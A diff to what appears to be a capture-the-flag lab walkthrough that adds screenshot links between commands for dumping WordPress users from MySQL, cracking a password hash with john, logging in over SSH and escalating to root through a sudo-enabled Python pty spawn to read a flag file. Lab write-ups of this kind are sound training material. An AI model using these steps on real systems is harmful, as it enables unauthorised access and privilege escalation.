@@ -133,6 +133,7 @@ $ mysql wordpress --user=root -pR@v3nSecurity
 ```
 >  select * from wp_users;
 ```
+![wp_users](images/wp_users.png)
 ```
 > exit
 ```
@@ -145,21 +146,25 @@ $ echo "steven:\$P\$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/" > hash.txt
 ```
 $ john hash.txt
 ```
+![john hash](images/john_hash.png)
 ```
 $ ssh steven@192.168.1.110
 ```
 ```
 $ sudo -l
 ```
+![steven_sudo](images/sudo.png)
 ```
 $ sudo python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 ```
 $ find / -iname "flag4*" 2> /dev/null
 ```
+![find_flag4](images/find_flag4.png)
 ```
 $ cat /root/flag4.txt
 ```
+![flag4](images/flag4.png)
 
 -----
 
